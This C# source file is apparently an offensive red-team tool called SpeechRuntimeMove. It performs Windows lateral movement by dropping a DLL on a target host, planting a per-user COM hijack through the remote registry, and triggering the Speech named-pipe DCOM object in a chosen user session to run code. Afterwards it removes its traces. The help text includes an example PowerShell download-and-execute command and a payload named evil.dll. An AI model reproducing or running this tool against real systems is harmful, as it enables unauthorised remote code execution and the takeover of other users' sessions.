using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using static SpeechRuntimeMove.Definitions;



namespace SpeechRuntimeMove
{
    static class Program
    {

        static void DisplayHelp()
        {
            Console.WriteLine("\nUsage:");
            Console.WriteLine("  Enumeration:  <Program> mode=enum target=<ip>");
            Console.WriteLine("  Attack:       <Program> mode=attack target=<ip> dllpath=<dllpath> targetuser=<targetuser> command=<command>");
            Console.WriteLine("\nExample:");
            Console.WriteLine("  <Program> mode=enum target=192.168.1.100");
            Console.WriteLine(@"  <Program> mode=attack target=192.168.1.100 dllpath=C:\windows\temp\evil.dll targetuser=domadm session=2 command=powershell.exe iex(new-object net.webclient).downloadstring('https://url.com/script.ps1')");
        }
        static void Main(string[] args)
        {
            Console.WriteLine(@"

   _____                      __    ____              __  _                __  ___
  / ___/____  ___  ___  _____/ /_  / __ \__  ______  / /_(_)___ ___  ___  /  |/  /___ _   _____
  \__ \/ __ \/ _ \/ _ \/ ___/ __ \/ /_/ / / / / __ \/ __/ / __ `__ \/ _ \/ /|_/ / __ \ | / / _ \
 ___/ / /_/ /  __/  __/ /__/ / / / _, _/ /_/ / / / / /_/ / / / / / /  __/ /  / / /_/ / |/ /  __/
/____/ .___/\___/\___/\___/_/ /_/_/ |_|\__,_/_/ /_/\__/_/_/ /_/ /_/\___/_/  /_/\____/|___/\___/
    /_/
         Lateral Movement via custom DCOM trigger
                          by @ShitSecure
    ");

            string targetIP = null;
            /*string username = null; custom user for execution removed for reasons
            string password = null;
            string domain = null;*/
            string dllPath = null;
            string targetUser = null;
            string command = null;
            string sessionstr = "1";
            string mode = "attack"; // Default mode

            // Parse named arguments
            foreach (string arg in args)
            {
                if (arg.StartsWith("mode=", StringComparison.OrdinalIgnoreCase))
                {
                    mode = arg.Substring(5).ToLower();
                }
                else if (arg.StartsWith("target=", StringComparison.OrdinalIgnoreCase))
                {
                    targetIP = arg.Substring(7);
                }
                else if (arg.StartsWith("dllpath=", StringComparison.OrdinalIgnoreCase))
                {
                    dllPath = arg.Substring(8);
                }
                else if (arg.StartsWith("targetuser=", StringComparison.OrdinalIgnoreCase))
                {
                    targetUser = arg.Substring(11);
                }
                else if (arg.StartsWith("command=", StringComparison.OrdinalIgnoreCase))
                {
                    command = arg.Substring(8);
                }
                else if (arg.StartsWith("session=", StringComparison.OrdinalIgnoreCase))
                {
                    sessionstr = arg.Substring(8);
                }
            }

            // Display help if no arguments or missing required parameters
            if (args.Length == 0 || targetIP == null)
            {
                DisplayHelp();
                return;
            }

            // Execute based on mode
            switch (mode)
            {
                case "enum":
                    Console.WriteLine($"[+] Enumerating sessions on {targetIP}...");
                    SpeechRuntimeMove.SessionEnum.enumerate(targetIP);
                    break;

                case "attack":
                    if (dllPath == null || targetUser == null || command == null)
                    {
                        Console.WriteLine("[!] Error: Attack mode requires dllpath and targetuser as well as command parameters");
                        DisplayHelp();
                        return;
                    }

                    if (FileDrop.DropIt(targetIP, dllPath, command))
                    {
                        Console.WriteLine($"[+] DLL dropped successfully!");
                    }
                    else
                    {
                        Console.WriteLine($"[-] DLL dropping failed!");
                        //return;
                    }

                    Console.WriteLine($"[+] Attempting COM hijack on {targetIP} for user {targetUser}");
                    RemoteRegistry.WriteRegistryEntryForUser(targetIP, targetUser, dllPath);

                    if (RemoteRegistry.VerifyRegistryEntry(targetIP, targetUser, dllPath))
                    {
                        Console.WriteLine("[+] Target user COM Hijack is set!");
                        MoveIt.Execute(targetIP, "", "", "", "", sessionstr);
                        Thread.Sleep(5000);

                        // cleanup everything
                        RemoteRegistry.DeleteRegistryEntry(targetIP, targetUser);
                        if (!RemoteRegistry.VerifyRegistryEntry(targetIP, targetUser, dllPath))
                        {
                            Console.WriteLine("[+] Target user COM Hijack is removed!");
                        }
                        RemoteRegistry.DisableRemoteRegistryViaWMI(targetIP);
                        FileDrop.RemoveFile(targetIP, dllPath);
                    }

                    break;

                default:
                    Console.WriteLine($"[!] Unknown mode: {mode}");
                    DisplayHelp();
                    break;
            }


            // Ensure that if username, password, and domain are provided, they are valid
            /*if (username != null && password != null && domain != null)
            {
                Server.Execute(targetIP, null, username, password, domain);
            }*/


        }
    }

    static class MoveIt
    {

        // Speech Named Pipe COM CLSID
        public static Guid clsid = new Guid("38FE8DFE-B129-452B-A215-119382B89E3D");
        public static IntPtr clsid_ptr = SpeechRuntimeMove.Definitions.GuidToPointer(clsid);

        public static void Execute(string targetIP, string path, string username, string password, string domain, string sessionstr)
        {


            IntPtr pAuthIdentity = IntPtr.Zero;
            IntPtr pAuthInfo = IntPtr.Zero;
            IntPtr pIID = IntPtr.Zero;
            SpeechRuntimeMove.Definitions.COSERVERINFO serverInfoPtr = new SpeechRuntimeMove.Definitions.COSERVERINFO();

            try
            {

                if (username == "")
                {
                    COAUTHINFO authInfo = new COAUTHINFO();
                    InitAuthStructs(ref authInfo);
                    pAuthInfo = Marshal.AllocCoTaskMem(Marshal.SizeOf(typeof(COAUTHINFO)));
                    Marshal.StructureToPtr(authInfo, pAuthInfo, false);
                }
                else
                {


                    SpeechRuntimeMove.Definitions.COAUTHIDENTITY authIdentity = new SpeechRuntimeMove.Definitions.COAUTHIDENTITY
                    {
                        User = username,
                        Domain = domain,
                        Password = password,
                        UserLength = (uint)username.Length,
                        DomainLength = (uint)domain.Length,
                        PasswordLength = (uint)password.Length,
                        Flags = 2 // SEC_WINNT_AUTH_IDENTITY_UNICODE
                    };

                    // Allocate and marshal authentication identity
                    pAuthIdentity = Marshal.AllocCoTaskMem(Marshal.SizeOf(typeof(COAUTHIDENTITY)));
                    Marshal.StructureToPtr(authIdentity, pAuthIdentity, false);

                    // Create authentication info
                    COAUTHINFO authInfo = new COAUTHINFO
                    {
                        dwAuthnSvc = RPC_C_AUTHN_WINNT,
                        dwAuthzSvc = RPC_C_AUTHZ_NONE,
                        pwszServerPrincName = IntPtr.Zero,
                        dwAuthnLevel = RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                        dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE,
                        pAuthIdentityData = pAuthIdentity,
                        dwCapabilities = EOAC_NONE
                    };

                    // Allocate and marshal authentication info
                    pAuthInfo = Marshal.AllocCoTaskMem(Marshal.SizeOf(typeof(COAUTHINFO)));
                    Marshal.StructureToPtr(authInfo, pAuthInfo, false);
                }

                serverInfoPtr.pAuthInfo = pAuthInfo;
                serverInfoPtr.pwszName = targetIP;


                SpeechRuntimeMove.Definitions.MULTI_QI[] qis = new SpeechRuntimeMove.Definitions.MULTI_QI[1];


                if (!uint.TryParse(sessionstr, out uint session))
                {
                    Console.WriteLine("[-] Invalid Session id");
                    return;
                }


                Console.WriteLine("[*] Registering...");
                var ba = GetMarshalledObject(new object());
                COMObjRefStandard std = (COMObjRefStandard)COMObjRef.FromArray(ba);
                Debug.WriteLine($"[*] IPID: {std.Ipid}");
                Debug.WriteLine($"[!] OXID: {std.Oxid:X08}");
                Debug.WriteLine($"[!] OID : {std.Oid:X08}");
                Console.WriteLine("[+] Register success");

                std.StringBindings.Clear();
                Debug.WriteLine($"[!] Adding {"empty hostname"} to OBJREF");
                // What about? RpcTowerId.NetbiosTcp....
                // UPD: Firewall....
                std.StringBindings.Add(new COMStringBinding(RpcTowerId.Tcp, ""));
                Debug.WriteLine($"[?] OBJREF: {std.ToMoniker()}");

                RpcServerUseProtseqEp("ncacn_ip_tcp", 20, "135", IntPtr.Zero);
                RpcServerRegisterAuthInfo(null, 16, IntPtr.Zero, IntPtr.Zero);


                int result;
                result = CreateILockBytesOnHGlobal(IntPtr.Zero, true, out ILockBytes lockBytes);
                result = StgCreateDocfileOnILockBytes(lockBytes, SpeechRuntimeMove.Definitions.STGM.CREATE | SpeechRuntimeMove.Definitions.STGM.READWRITE | SpeechRuntimeMove.Definitions.STGM.SHARE_EXCLUSIVE, 0, out IStorage storage);

                // we could trigger authentication here to a remote host, but we dont need this as we execute code instead :-P
                var storageTrigger = new SpeechRuntimeMove.Definitions.StorageTrigger(storage, "", SpeechRuntimeMove.Definitions.TowerProtocol.EPM_PROTOCOL_TCP, std);

                // IID of ISpeechNamedPipe
                Guid iid = new Guid("67C43788-DFDE-464E-BAA1-5AFA424895FD");
                IntPtr iid_ptr = SpeechRuntimeMove.Definitions.GuidToPointer(iid);
                qis[0] = new SpeechRuntimeMove.Definitions.MULTI_QI();
                qis[0].pIID = iid_ptr;

                var pComAct = (SpeechRuntimeMove.Definitions.IStandardActivator)new SpeechRuntimeMove.Definitions.StandardActivator();
                var CLSID_ComActivator = new Guid("{0000033C-0000-0000-c000-000000000046}");
                var IID_IStandardActivator = typeof(SpeechRuntimeMove.Definitions.IStandardActivator).GUID;

                var ht = CoCreateInstance(ref CLSID_ComActivator, null, 0x1, ref IID_IStandardActivator, out object instance);

                if (ht != 0)
                {
                    Console.WriteLine($"[-] CoCreateInstance failed with HRESULT: 0x{ht:X}");
                    throw new COMException("[-] CoCreateInstance failed");
                }
                else
                {
                    Console.WriteLine("[+] CoCreateInstance succeeded!");
                }
                pComAct = (SpeechRuntimeMove.Definitions.IStandardActivator)instance;
                var props = (SpeechRuntimeMove.Definitions.ISpecialSystemPropertiesActivator)pComAct;

                Console.WriteLine($"[*] Targetting session {session}");
                props.SetSessionId((int)session, 0, 1);

                try
                {
                    result = pComAct.StandardGetInstanceFromIStorage(serverInfoPtr, clsid, IntPtr.Zero, SpeechRuntimeMove.Definitions.CLSCTX.CLSCTX_REMOTE_SERVER, storageTrigger, 1, qis);
                }
                catch (Exception e)
                {
                    //Console.WriteLine("[!] Done");
                    //Console.WriteLine(e);
                }
                Console.WriteLine("[*] Done");


            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Error while calling remote COM object:");
                Console.WriteLine(e);
            }
        }
    }
}
